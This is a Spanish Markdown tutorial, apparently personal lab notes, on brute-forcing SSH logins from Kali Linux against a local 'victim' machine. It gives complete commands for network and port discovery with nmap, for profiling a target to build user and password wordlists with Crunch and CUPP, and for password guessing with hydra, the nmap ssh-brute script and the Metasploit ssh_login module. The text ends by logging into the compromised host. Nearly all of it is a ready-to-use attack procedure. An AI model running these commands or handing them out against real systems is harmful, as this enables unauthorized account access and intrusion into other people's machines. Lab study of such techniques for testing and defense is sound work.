# Pasos SSH

---

## Fuerza Bruta

Estando en la distribución Kali Linux, realizamos los siguientes pasos:

### Identificación de la Red

1. Ejecutamos el comando ```ip a``` para obtener la dirección ```ip``` de nuestras interfaces.

   <img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201024224331156.png" alt="image-20201024224331156" style="zoom:40%;" />

2. Luego, podemos calcular la red base con el comando ```ipcalc <nuestra ip>```

   <img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201024224108944.png" alt="image-20201024224108944" style="zoom:40%;" />

3. Con la red base podemos proceder a ejecutar ```nmap -sP <ip base>/<mascara>``` para poder ver todos los dispositivos en la red.

<img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201024224619771.png" alt="image-20201024224619771" style="zoom:40%;" />

Como podemos ver en nuestro ejemplo, tenemos 2 pcs conectadas, una somos nosotros (```192.168.1.3```) y la otra es a quien atacaremos (```192.168.1.2```).

4. Ahora procedemos a ejecutar ```nmap <ip victima>/<mascara>``` para ver que puertos están abiertos:

   <img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201024224901677.png" alt="image-20201024224901677" style="zoom:40%;" />

   En nuestro caso vemos que nuestra victima tiene 3 servicios corriendo y en que puertos.

### Resumen

* ```ip a```: ver las interfaces
* ```ipcalc <nuestra ip>```: calculamos la red base y su mascara.
* ```nmap -sP <ip base>/<mascara>```: realizamos un análisis con los dispositivos encontrados. 
* ```nmap <ip victima>/<mascara>```: vemos los puertos abiertos y tomamos nota.

---

## Hacking por Fuerza Bruta

### Creación de Diccionarios

Para realizar un ataque de fuerza bruta, necesitamos realizar un estudio de la víctima a atacar (llamado **Password Profiling**) , nombre, nombre de conocidos, usuarios en sitios, mascota, fechas importantes, etc. Todo esto con la finalidad de tener una idea de como crear los diccionarios de **Usuarios** y **Passwords**. Para ello tenemos dos herramientas **Crunch** y **CUPP**.

* **Crunch (``sudo apt-get install crunch``)**

  Simplemente ejecutamos: ```crunch <minimo> <maximo> <alfabeto> -t <PALABRA> -o <archivo salida>```

  **Ejemplos**: 

  **Generar contraseñas:** ```crunch 12 12 vlada7198.rfe -t vlada@@@@@@@ -o passwords.txt```
  **Generar usuarios:** ```crunch 9 9 rochi987 -t tobo@@@@@ -o users.txt```

  Las ```@``` son donde **Crunch** intentará hacer todas las permutaciones con los simbolos del ```<alfabeto>```.

* **CUPP  (``sudo apt-get install cupp``)**

  Simplemente ejecutamos ```cupp -i``` y se nos dará una lista de preguntas sobre nuestra victima. Al final de ese proceso tendremos un archivo con las posibles **contraseñas** de usuarios que tenga la victima.

### Fuerza Bruta

* ```hydra```: ```hydra -L users.txt -P passwords.txt ssh://<direccion ip victima> -t <# hilos>```

  <img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201025070211098.png" alt="image-20201025070211098" style="zoom:33%;" />

* ```nmap```: ```nmap <direccion ip victima> -p <puerto> --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt```

  <img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201025070633113.png" alt="image-20201025070633113" style="zoom:35%;" />

  <img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201025070700650.png" alt="image-20201025070700650" style="zoom:35%;" />

* ```metasploit```

  1. ```msfconsole```
  2. ```search ssh```
  3. Buscamos la vulnerabilidad que necesitamos, en nuestro caso: ```auxiliary/scanner/ssh/ssh_login``` y **ejecutamos**: ```use auxiliary/scanner/ssh/ssh_login```
  4. ```show options``` y buscamos las opciones que nos interesan: **RHOSTS, STOP_ON_SUCCESS, USER_FILE, PASS_FILE**
  5. ```set rhosts <direccion ip victima>```
  6. ```set stop_on_success true```
  7. ```set user_file users.txt```
  8. ```set pass_file passwords.txt```
  9. ```set verbose true```
  10. ```run```

  <img src="C:\Users\Asus\AppData\Roaming\Typora\typora-user-images\image-20201025071732726.png" alt="image-20201025071732726" style="zoom:35%;" />

  **NOTA:** ```exit -y``` para salir del prompt de metasploit.

Podemos acceder a la PC atacada con: ```ssh <usuario>@<direccion ip>```

Podemos ver los **logs** con: ```nano /var/log/auth.log```

